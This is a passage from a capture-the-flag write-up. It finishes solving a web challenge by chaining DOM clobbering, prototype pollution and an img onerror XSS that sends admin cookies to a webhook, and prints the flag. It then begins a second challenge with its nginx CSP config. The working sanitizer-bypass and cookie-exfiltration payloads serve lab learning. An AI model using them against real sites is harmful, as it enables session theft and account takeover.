</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">2
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>&lt;<span style=color:#e06c75>h1</span> <span style=color:#b3d23c>id</span><span style=color:#c7bf54>=</span><span style=color:#98c379>&#34;debug&#34;</span> <span style=color:#b3d23c>name</span><span style=color:#c7bf54>=</span><span style=color:#98c379>&#34;blahblah&#34;</span>&gt;xx&lt;/<span style=color:#e06c75>h1</span>&gt;
</span></span><span style=display:flex><span>&lt;<span style=color:#e06c75>h2</span> <span style=color:#b3d23c>id</span><span style=color:#c7bf54>=</span><span style=color:#98c379>&#34;debug&#34;</span> <span style=color:#b3d23c>name</span><span style=color:#c7bf54>=</span><span style=color:#98c379>&#34;extension&#34;</span>&gt;yy&lt;/<span style=color:#e06c75>h2</span>&gt;
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">5
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#c7bf54>&gt;</span> <span style=color:#ef8383>window</span>.<span style=color:#c1abea>debug</span>
</span></span><span style=display:flex><span><span style=color:#c1abea>HTMLCollection</span>(<span style=color:#d19a66>2</span>) [<span style=color:#c1abea>h1</span>#<span style=color:#c1abea>debug</span>, <span style=color:#c1abea>h2</span>#<span style=color:#c1abea>debug</span>, <span style=color:#c1abea>debug</span><span style=color:#c7bf54>:</span> <span style=color:#c1abea>h1</span>#<span style=color:#c1abea>debug</span>, <span style=color:#c1abea>extension</span><span style=color:#c7bf54>:</span> <span style=color:#c1abea>h1</span>#<span style=color:#c1abea>debug</span>, <span style=color:#c1abea>blahblah</span><span style=color:#c7bf54>:</span> <span style=color:#c1abea>h2</span>#<span style=color:#c1abea>debug</span>]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#c7bf54>&gt;</span> <span style=color:#ef8383>window</span>.<span style=color:#c1abea>debug</span>.<span style=color:#c1abea>extension</span>
</span></span><span style=display:flex><span><span style=color:#c7bf54>&lt;</span><span style=color:#c1abea>h1</span> <span style=color:#c1abea>id</span><span style=color:#c7bf54>=</span><span style=color:#63c381>&#34;debug&#34;</span> <span style=color:#c1abea>name</span><span style=color:#c7bf54>=</span><span style=color:#63c381>&#34;extension&#34;</span><span style=color:#c7bf54>&gt;</span><span style=color:#c1abea>xx</span><span style=color:#c7bf54>&lt;</span>/h1&gt;
</span></span></code></pre></td></tr></table></div></div><p>But there&rsquo;s a small caveat. The URL that gets fetched is through <code>window.debug.extension.toString()</code>, and if we try that here:</p><div class=highlight><div style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">2
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#c7bf54>&gt;</span> <span style=color:#ef8383>window</span>.<span style=color:#c1abea>debug</span>.<span style=color:#c1abea>extension</span>.<span style=color:#c1abea>toString</span>()
</span></span><span style=display:flex><span><span style=color:#98c379>&#39;[object HTMLHeadingElement]&#39;</span>
</span></span></code></pre></td></tr></table></div></div><p>So clearly we need to find a way so that <code>toString</code> returns a valid URL. Well, luckily for me, the first Google result for &ldquo;html element with built in tostring&rdquo; is <a href=https://developer.mozilla.org/en-US/docs/Web/API/HTMLAnchorElement/toString>this very helpful Mozilla Web Docs page</a>:</p><p><img src=/img/writeups/2023/upsolving/web-workshop-1/htmlanchortostring.png alt="HTML Anchor toString method"></p><p>So we just need to use an <code>a</code> tag, and put in our own URL inside of the <code>href</code> attribute. There&rsquo;s a bit of jank here with getting the sanitizer to happily accept the HTML, but here&rsquo;s one payload that works (for further in this writeup, both tags will be <code>a</code> tags for simplicity):</p><div class=highlight><div style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">2
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>&lt;<span style=color:#e06c75>h1</span> <span style=color:#b3d23c>id</span><span style=color:#c7bf54>=</span><span style=color:#98c379>debug</span> <span style=color:#b3d23c>name</span><span style=color:#c7bf54>=</span><span style=color:#98c379>blahblah</span>&gt;
</span></span><span style=display:flex><span>&lt;<span style=color:#e06c75>a</span> <span style=color:#b3d23c>id</span><span style=color:#c7bf54>=</span><span style=color:#98c379>debug</span> <span style=color:#b3d23c>name</span><span style=color:#c7bf54>=</span><span style=color:#98c379>extension</span> <span style=color:#b3d23c>href</span><span style=color:#c7bf54>=</span><span style=color:#98c379>https://pastebin.com/raw/MePPfNZJ</span>&gt; 
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">5
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#c7bf54>&gt;</span> <span style=color:#ef8383>window</span>.<span style=color:#c1abea>debug</span>
</span></span><span style=display:flex><span><span style=color:#c1abea>HTMLCollection</span>(<span style=color:#d19a66>2</span>) [<span style=color:#c1abea>a</span>#<span style=color:#c1abea>debug</span>, <span style=color:#c1abea>a</span>#<span style=color:#c1abea>debug</span>, <span style=color:#c1abea>debug</span><span style=color:#c7bf54>:</span> <span style=color:#c1abea>a</span>#<span style=color:#c1abea>debug</span>, <span style=color:#c1abea>blahblah</span><span style=color:#c7bf54>:</span> <span style=color:#c1abea>a</span>#<span style=color:#c1abea>debug</span>, <span style=color:#c1abea>extension</span><span style=color:#c7bf54>:</span> <span style=color:#c1abea>a</span>#<span style=color:#c1abea>debug</span>]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#c7bf54>&gt;</span> <span style=color:#ef8383>window</span>.<span style=color:#c1abea>debug</span>.<span style=color:#c1abea>extension</span>.<span style=color:#c1abea>toString</span>()
</span></span><span style=display:flex><span><span style=color:#98c379>&#39;https://evil.com/&#39;</span>
</span></span></code></pre></td></tr></table></div></div><p>DOM Clobbered!</p><h3 id=debugsanitize>debug.sanitize</h3><p>Now we need to have some valid <code>json</code> at the URL we control that turns <code>debug.sanitize</code> to false. Looking back at the code, we can see that <code>debug</code> is actually an object from an existing class:</p><div class=highlight><div style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">10
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#c678dd>class</span> <span style=color:#c1abea>Debug</span> {
</span></span><span style=display:flex><span>    #<span style=color:#c1abea>sanitize</span>;
</span></span><span style=display:flex><span>    <span style=color:#c1abea>constructor</span>(<span style=color:#c1abea>sanitize</span> <span style=color:#c7bf54>=</span> <span style=color:#b756ff;font-weight:700>true</span>) {
</span></span><span style=display:flex><span>        <span style=color:#c678dd>this</span>.#<span style=color:#c1abea>sanitize</span> <span style=color:#c7bf54>=</span> <span style=color:#c1abea>sanitize</span>
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#c1abea>get</span> <span style=color:#c1abea>sanitize</span>() {
</span></span><span style=display:flex><span>        <span style=color:#c678dd>return</span> <span style=color:#c678dd>this</span>.#<span style=color:#c1abea>sanitize</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span></code></pre></td></tr></table></div></div><p>At first glance, it seems like it&rsquo;s impossible to set <code>sanitize</code> to false, since it&rsquo;s both a private variable and there is no setter. But since we have arbitrary JSON, we can use another favorite web exploit: Prototype Pollution!</p><p>If we pass in something like this, all of a sudden we&rsquo;ll notice that the <code>sanitize</code> property is now false:</p><div class=highlight><div style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">1
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span>{<span style=color:#e06c75>&#34;__proto__&#34;</span>: {<span style=color:#e06c75>&#34;sanitize&#34;</span>: <span style=color:#b756ff;font-weight:700>false</span>}}
</span></span></code></pre></td></tr></table></div></div><p>Putting this together, we can actually just stick this as a <code>data:</code> URL in the <code>href</code> attribute (remember to URL encode!). To do this step, we also need to make a few adjustments so that the <code>href</code> attribute is not removed by the sanitizer:</p><div class=highlight><div style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">3
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span><span style=color:#8a93a5;font-style:italic>&lt;!-- Both are valid payloads --&gt;</span>
</span></span><span style=display:flex><span>&lt;<span style=color:#e06c75>a</span> <span style=color:#b3d23c>id</span><span style=color:#c7bf54>=</span><span style=color:#98c379>debug</span>&gt;&lt;<span style=color:#e06c75>a</span> <span style=color:#b3d23c>id</span><span style=color:#c7bf54>=</span><span style=color:#98c379>debug</span> <span style=color:#b3d23c>name</span><span style=color:#c7bf54>=</span><span style=color:#98c379>extension</span> <span style=color:#b3d23c>href</span><span style=color:#c7bf54>=</span><span style=color:#98c379>&#39;data:;,%7B%22__proto__%22:%7B%22sanitize%22:&#34;&#34;%7D%7D&#39;</span>&gt; 
</span></span><span style=display:flex><span>&lt;<span style=color:#e06c75>a</span> <span style=color:#b3d23c>id</span><span style=color:#c7bf54>=</span><span style=color:#98c379>debug</span>&gt;&lt;<span style=color:#e06c75>a</span> <span style=color:#b3d23c>id</span><span style=color:#c7bf54>=</span><span style=color:#98c379>debug</span> <span style=color:#b3d23c>name</span><span style=color:#c7bf54>=</span><span style=color:#98c379>extension</span> <span style=color:#b3d23c>href</span><span style=color:#c7bf54>=</span><span style=color:#98c379>&#39;data:;,%7B%22__proto__%22:%7B%22sanitize%22:0%7D%7D&#39;</span>&gt;
</span></span></code></pre></td></tr></table></div></div><p>Now we can actually get XSS!</p><h3 id=altogether-now>Altogether now</h3><p>Finally, the last step is just to exfiltrate the admin cookies with simple XSS. The HTML is set using innerHTML, we can&rsquo;t run scripts, but a simple <code>img</code> XSS will do the trick:</p><div class=highlight><div style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">1
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>&lt;<span style=color:#e06c75>img</span> <span style=color:#b3d23c>src</span><span style=color:#c7bf54>=</span><span style=color:#98c379>1</span> <span style=color:#b3d23c>onerror</span><span style=color:#c7bf54>=</span><span style=color:#98c379>&#34;fetch(&#39;[webhook url]/?&#39; + document.cookie&#34;</span>&gt;
</span></span></code></pre></td></tr></table></div></div><p>With everything done now, here&rsquo;s what the full attack looks like:</p><p>First we have a DOM Clobbering in the title:</p><div class=highlight><div style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">6
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span><span style=color:#8a93a5;font-style:italic>&lt;!-- Either one is valid, above doesn&#39;t use controlled endpoint --&gt;</span>
</span></span><span style=display:flex><span>&lt;<span style=color:#e06c75>a</span> <span style=color:#b3d23c>id</span><span style=color:#c7bf54>=</span><span style=color:#98c379>debug</span>&gt;
</span></span><span style=display:flex><span>&lt;<span style=color:#e06c75>a</span> <span style=color:#b3d23c>id</span><span style=color:#c7bf54>=</span><span style=color:#98c379>debug</span> <span style=color:#b3d23c>name</span><span style=color:#c7bf54>=</span><span style=color:#98c379>extension</span> <span style=color:#b3d23c>href</span><span style=color:#c7bf54>=</span><span style=color:#98c379>&#39;data:;,%7B%22__proto__%22:%7B%22sanitize%22:&#34;&#34;%7D%7D&#39;</span>&gt; 
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>&lt;<span style=color:#e06c75>a</span> <span style=color:#b3d23c>id</span><span style=color:#c7bf54>=</span><span style=color:#98c379>debug</span>&gt;
</span></span><span style=display:flex><span>&lt;<span style=color:#e06c75>a</span> <span style=color:#b3d23c>id</span><span style=color:#c7bf54>=</span><span style=color:#98c379>debug</span> <span style=color:#b3d23c>name</span><span style=color:#c7bf54>=</span><span style=color:#98c379>extension</span> <span style=color:#b3d23c>href</span><span style=color:#c7bf54>=</span><span style=color:#98c379>&#34;https://evil.com&#34;</span>&gt;
</span></span></code></pre></td></tr></table></div></div><p>Inside the DOM Clobber, we load the <code>debug</code> object using this Prototype Pollution JSON:</p><div class=highlight><div style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">1
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span>{<span style=color:#e06c75>&#34;__proto__&#34;</span>: {<span style=color:#e06c75>&#34;sanitize&#34;</span>: <span style=color:#b756ff;font-weight:700>false</span>}}
</span></span></code></pre></td></tr></table></div></div><p>Then finally, in the body, we have a simple cookie exfil XSS:</p><div class=highlight><div style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">1
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>&lt;<span style=color:#e06c75>img</span> <span style=color:#b3d23c>src</span><span style=color:#c7bf54>=</span><span style=color:#98c379>1</span> <span style=color:#b3d23c>onerror</span><span style=color:#c7bf54>=</span><span style=color:#98c379>&#34;fetch(&#39;[webhook url]/?&#39; + document.cookie&#34;</span>&gt;
</span></span></code></pre></td></tr></table></div></div><p>Submitting this to the server and reporting, we get our flag!</p><p><img src=/img/writeups/2023/upsolving/web-workshop-1/sanity-flag.png alt=flag.png></p><pre tabindex=0><code>amateursCTF{s@nit1zer_ap1_pr3tty_go0d_but_not_p3rf3ct}
</code></pre><p>Overall, this was a really cool challenge comboing 3 different web attacks, and chained together, was a fun challenge to solve!</p><h2 id=amogus>amogus</h2><blockquote><p><strong>Description</strong></p><p>Sometimes the strongest among us are the ones who smile through silent pain, cry behind closed doors, and fight battles nobody knows about.</p><p><strong>Attachments</strong></p><p><a href=https://imaginaryctf.org/r/cXEZL>amogus_dist.zip</a> <a href=http://amogus.chal.imaginaryctf.org/>http://amogus.chal.imaginaryctf.org/</a></p><p><code>nc amogus-admin-bot.chal.imaginaryctf.org 1337</code></p></blockquote><p>This one is a LOT more complicated than <code>sanity</code>. First of all, there&rsquo;s a little prep, where we have to point some virtual hosts to the server:</p><pre tabindex=0><code>34.90.88.125 supersus.corp
34.90.88.125 auth.supersus.corp
34.90.88.125 mail.supersus.corp
</code></pre><p>There are guides for this online, I won&rsquo;t go into that.</p><p>Now, visiting the uppermost link is just a redirect to <a href=http://amogus.chal.imaginaryctf.org/>http://amogus.chal.imaginaryctf.org/</a>, and doesn&rsquo;t have anything useful.
Instead, we need to use the other two subdomains.</p><p>But before we visit those, let&rsquo;s also take a quick look at the <code>nc</code> connection:</p><pre tabindex=0><code>$ nc amogus-admin-bot.chal.imaginaryctf.org 1337
== proof-of-work: disabled ==
Please send me a URL to open, on the site http://auth.supersus.corp
http://auth.supersus.corp/A/B/C
Loading page http://auth.supersus.corp/A/B/C.
</code></pre><p>It appears to just be a simple XSS bot on the <code>auth.supersus.corp</code> website.</p><h3 id=source-1>Source</h3><p>There&rsquo;s a lot of files to go through here, so here are the most important ones:</p><p>First, we have two services, <code>auth</code> and <code>mail</code> (condensed into one file here). Note that <code>auth</code> has a set CSP header:</p><p>filename=nginx.conf</p><div class=highlight><div style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">21
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-nginx data-lang=nginx><span style=display:flex><span><span style=color:#c678dd>server</span> {
</span></span><span style=display:flex><span>        <span style=color:#c678dd>server_name</span> <span style=color:#98c379>auth.supersus.corp</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#c678dd>location</span> <span style=color:#98c379>/</span> {
</span></span><span style=display:flex><span>            <span style=color:#c678dd>proxy_pass</span> <span style=color:#98c379>http://localhost:8081/</span>;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#c678dd>add_header</span> <span style=color:#98c379>Content-Security-Policy</span> <span style=color:#98c379>&#34;sandbox</span> <span style=color:#98c379>allow-forms</span> <span style=color:#98c379>allow-same-origin</span>; <span style=color:#c678dd>img-src</span> <span style=color:#98c379>*</span>; <span style=color:#c678dd>default-src</span> <span style=color:#98c379>none</span>; <span style=color:#c678dd>style-src</span> <span style=color:#98c379>&#39;self&#39;</span>; <span style=color:#c678dd>script-src</span> <span style=color:#98c379>none</span>; <span style=color:#c678dd>object-src</span> <span style=color:#98c379>http:</span> <span style=color:#98c379>https:</span>; <span style=color:#c678dd>frame-src</span> <span style=color:#98c379>http:</span> <span style=color:#98c379>https:</span>;<span style=color:#c678dd>&#34;</span> <span style=color:#98c379>always</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#c678dd>listen</span> <span style=color:#d19a66>80</span>;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#c678dd>server</span> {
</span></span><span style=display:flex><span>        <span style=color:#c678dd>server_name</span> <span style=color:#98c379>mail.supersus.corp</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#c678dd>location</span> <span style=color:#98c379>/</span> {
</span></span><span style=display:flex><span>            <span style=color:#c678dd>proxy_pass</span> <span style=color:#98c379>http://localhost:8080/</span>;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#c678dd>listen</span> <span style=color:#d19a66>80</span>;
</span></span><span style=display:flex><span>}
</span></span></code></pre></td></tr></table></div></div><p>For the actual <code>auth</code> app, we have a simple Flask server that uses a SQLAlchemy Database:</p><p>filename=app.py</p><div class=highlight><div style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 3
